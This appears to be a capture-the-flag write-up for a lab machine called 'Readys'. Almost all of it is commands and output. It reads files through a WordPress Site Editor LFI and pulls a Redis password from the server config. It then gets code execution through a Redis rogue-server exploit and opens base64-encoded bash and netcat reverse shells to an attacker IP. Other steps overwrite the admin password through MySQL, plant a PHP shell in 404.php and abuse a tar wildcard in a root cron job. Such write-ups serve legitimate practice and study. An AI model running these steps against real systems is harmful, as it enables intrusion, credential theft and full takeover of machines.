# Readys

### Enumeration

```
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.7.2
|_http-title: Readys &#8211; Just another WordPress site
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
6379/tcp open  redis   Redis key-value store
```

```
$ wpscan --url http://192.168.147.166/ --api-token [REDACTED]
...
[+] site-editor
 | Location: http://192.168.147.166/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 | Readme: http://192.168.147.166/wp-content/plugins/site-editor/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.147.166/wp-content/plugins/site-editor/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
```

WordPress Plugin Site Editor 1.1.1 - Local File Inclusion

https://www.exploit-db.com/exploits/44340

```
** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

```
$ redis-cli -h 192.168.147.166
192.168.147.166:6379> info
NOAUTH Authentication required.

/etc/redis/redis.conf

/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf

requirepass [REDACTED]
```

### Initial Access

Redis 4x-5x RCE

[https://github.com/vulhub/redis-rogue-getshell](https://github.com/vulhub/redis-rogue-getshell)

```
$ git clone https://github.com/vulhub/redis-rogue-getshell.git
$ cd redis-rogue-getshell
$ cd RedisModulesSDK
$ make
$ cd ..

$ python3 redis-master.py -r 192.168.147.166 -p 6379 -L 192.168.49.147 -P 80 -f RedisModulesSDK/exp.so -a "[REDACTED]" -c "id"
uid=107(redis) gid=114(redis) groups=114(redis)

# Reverse Shell
/bin/bash -i >& /dev/tcp/192.168.49.147/8080 0>&1 - Base64 Encoded

$ python3 redis-master.py -r 192.168.147.166 -p 6379 -L 192.168.49.147 -P 80 -f RedisModulesSDK/exp.so -a "[REDACTED]" -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDkuMTQ3LzgwODAgMD4mMQ== | base64 -d > /tmp/evil.sh"
$ python3 redis-master.py -r 192.168.147.166 -p 6379 -L 192.168.49.147 -P 80 -f RedisModulesSDK/exp.so -a "[REDACTED]" -c "bash -p /tmp/evil.sh"
```

### Lateral Movement

```
/** MySQL database username */
define( 'DB_USER', 'karl' );

/** MySQL database password */
define( 'DB_PASSWORD', '[REDACTED]' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

redis@readys:/var/www/html$ mysql -u karl --password=[REDACTED] -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"

# admin:hacked
```

[https://www.revshells.com/](https://www.revshells.com) - PHP PentestMonkey - /bin/bash -> Added to 404.php

### PrivEsc

```
alice@readys:/$ cat /etc/crontab
*/3 * * * * root /usr/local/bin/backup.sh

alice@readys:/$ ls -lh /usr/local/bin/backup.sh
-rwxr-xr-x 1 root root 122 Nov 17 12:36 /usr/local/bin/backup.sh

#!/bin/bash

cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
```

There is a wildcard usage.

[https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

```
alice@readys:/$ cd /var/www/html

# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.49.147 80 >/tmp/f - Base64 Encoded

alice@readys:/var/www/html$ echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ5LjE0NyA4MCA+L3RtcC9m | base64 -d > shell.sh
alice@readys:/var/www/html$ echo "" > "--checkpoint-action=exec=sh shell.sh"
alice@readys:/var/www/html$ echo "" > --checkpoint=1
```

